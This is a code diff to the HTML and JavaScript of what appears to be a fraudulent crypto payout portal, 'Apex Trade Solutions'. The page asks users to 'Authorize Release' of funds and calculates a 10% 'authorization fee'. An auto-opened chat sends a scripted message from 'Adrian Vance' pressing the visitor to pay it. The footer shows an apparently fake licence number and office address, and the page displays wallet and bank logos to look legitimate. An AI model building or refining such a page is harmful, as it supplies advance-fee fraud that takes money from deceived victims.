@@ -32,8 +32,15 @@
         .signature-font { font-family: 'Brush Script MT', cursive; font-size: 1.5rem; }
         
         footer { border-top: 1px solid rgba(255,255,255,0.1); }
-        .wallet-icon { filter: grayscale(100%) brightness(200%); opacity: 0.6; transition: 0.3s; }
-        .wallet-icon:hover { filter: grayscale(0%); opacity: 1; }
+        
+        .wallet-icon {
+            filter: brightness(0) invert(1) opacity(0.7);
+            transition: filter 0.3s ease;
+        }
+        
+        .wallet-icon:hover {
+            filter: brightness(0) invert(1) opacity(1);
+        }
     </style>
 
     <script type="text/javascript">
@@ -162,13 +169,16 @@
             <button type="submit" class="w-full btn-gradient text-white font-bold py-4 rounded-xl shadow-lg uppercase tracking-widest text-center mt-4">Authorize Release</button>
         </form>
 
-        <div class="pt-8 text-center space-y-4">
-            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Supported Settlement Wallets</p>
-            <div class="flex flex-wrap justify-center gap-6 opacity-50">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Coinbase_SVG_Logo.svg" alt="Coinbase" class="h-5 wallet-icon">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" alt="MetaMask" class="h-5 wallet-icon">
-                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust Wallet" class="h-5 wallet-icon">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Binance_logo.svg" alt="Binance" class="h-5 wallet-icon">
+        <div class="pt-8 text-center space-y-4 pb-10">
+            <p class="text-[10px] text-slate-300 font-bold uppercase tracking-widest">Supported Settlement Wallets</p>
+            <div class="flex flex-wrap justify-center items-center gap-x-8 gap-y-6 px-6">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" alt="MetaMask" class="h-6 wallet-icon">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust Wallet" class="h-6 wallet-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ac/Coinbase_Logo.svg" alt="Coinbase" class="h-6 wallet-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Binance_logo.svg" alt="Binance" class="h-6 wallet-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Phantom-logo-white.svg" alt="Phantom" class="h-6 wallet-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d4/Bitcoin.com_Logo.svg" alt="Bitcoin.com" class="h-6 wallet-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/ff/CoinSpot_Logo.png" alt="CoinSpot" class="h-6 wallet-icon">
             </div>
         </div>
     </main>
@@ -188,7 +198,7 @@
             </div>
             <div class="pt-6 border-t border-white/5">
                 <p class="text-[9px] text-slate-500 leading-relaxed">
-                    © 2026 Apex Trade Solutions. All Rights Reserved. <br>
+                    © 2023 Apex Trade Solutions. All Rights Reserved. <br>
                     Licensed Digital Asset Service Provider (DASP) #ATS-88210. <br>
                     Registered Office: 161 Bay St., Toronto, ON M5J 2S1, Canada.
                 </p>
@@ -197,14 +207,6 @@
     </footer>
 
     <script>
-        const translations = {
-            en: { fee: "Authorization Requirement (10%)" },
-            fr: { fee: "Exigence d'Autorisation (10%)" },
-            es: { fee: "Requisito de Autorización (10%)" },
-            no: { fee: "Autorisasjonskrav (10%)" },
-            de: { fee: "Autorisierungsanforderung (10%)" }
-        };
-
         const bankData = {
             "USA": ["JP Morgan Chase", "Bank of America", "Wells Fargo", "Citibank"],
             "Canada": ["RBC", "TD Bank", "Scotiabank", "BMO"],
@@ -224,14 +226,6 @@
             "Mexico": ["BBVA México", "Santander México", "Banamex"],
             "Egypt": ["National Bank of Egypt", "Banque Misr", "CIB Egypt"]
         };
-
-        function changeLanguage() {
-            const lang = document.getElementById("langSelect").value;
-            const t = translations[lang];
-            if(t) {
-                document.getElementById("ui-fee-label").innerText = t.fee;
-            }
-        }
 
         function updateBanks() {
             const country = document.getElementById("countrySelect").value;
@@ -253,7 +247,6 @@
             const feeDisplay = document.getElementById("feeDisplay");
             if (amount > 0) {
                 summary.classList.remove('hidden');
-                // Updated calculation to 10% (0.10)
                 feeDisplay.innerText = "$" + (amount * 0.10).toLocaleString();
             } else {
                 summary.classList.add('hidden');
@@ -275,7 +268,6 @@
         _smartsupp('on', 'load', function() {
             setTimeout(function() {
                 _smartsupp('chat:open');
-                // Updated Adrian Vance message to 10%
                 _smartsupp('message:send', { text: "Authorized Session: I am Adrian Vance. I am monitoring your payout request. Please complete the form and pay the 10% authorization fee to finalize your disbursement." });
             }, 3000);
         });
